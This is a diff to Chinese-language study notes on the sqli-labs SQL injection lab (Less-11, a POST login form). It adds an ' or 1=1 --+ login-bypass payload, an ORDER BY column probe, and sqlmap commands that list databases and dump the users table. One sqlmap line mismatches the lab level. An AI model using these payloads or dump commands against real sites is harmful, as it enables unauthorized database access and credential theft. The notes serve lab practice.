@@ -7,12 +7,14 @@
 　　不能再利用hackbar进行get传参
 
 　　可以直接在输入框进行注入
+　　尝试过两个框（两个注入点）都能注入，这里就以Username举例
 
 　　尝试万能密码：'or 1=1 --+
 
 ![image](assets/image-20250426193017-47997hn.png)
 
-　　判断字段数:'or 1=1 order by 2 --+![屏幕截图 2025-04-26 193503](assets/屏幕截图%202025-04-26%20193503-20250426193549-af519pr.png)
+　
+  判断字段数:'or 1=1 order by 2 --+![屏幕截图 2025-04-26 193503](assets/屏幕截图%202025-04-26%20193503-20250426193549-af519pr.png)
 
 ![image](assets/image-20250426193616-64hs96r.png)
 
@@ -40,4 +42,13 @@
 
 ---
 **使用sqlmap**
+post用
+sqlmap -u "url" --data "注入数据"
 
+sqlmap -u "ip/Less-11/" --data="uname=admin&passwd=admin" --batch --dbs #爆库
+![](assets/Less-11/file-20260530215616818.png)
+
+sqlmap -u "ip/Less-8/?id=1" --data="uname=admin&passwd=admin" --batch -D security --tables #爆库
+![](assets/Less-11/file-20260530220330691.png)
+
+sqlmap -u "ip/Less-8/?id=1" --data="uname=admin&passwd=admin" --batch -D security -T users --dump #爆数据
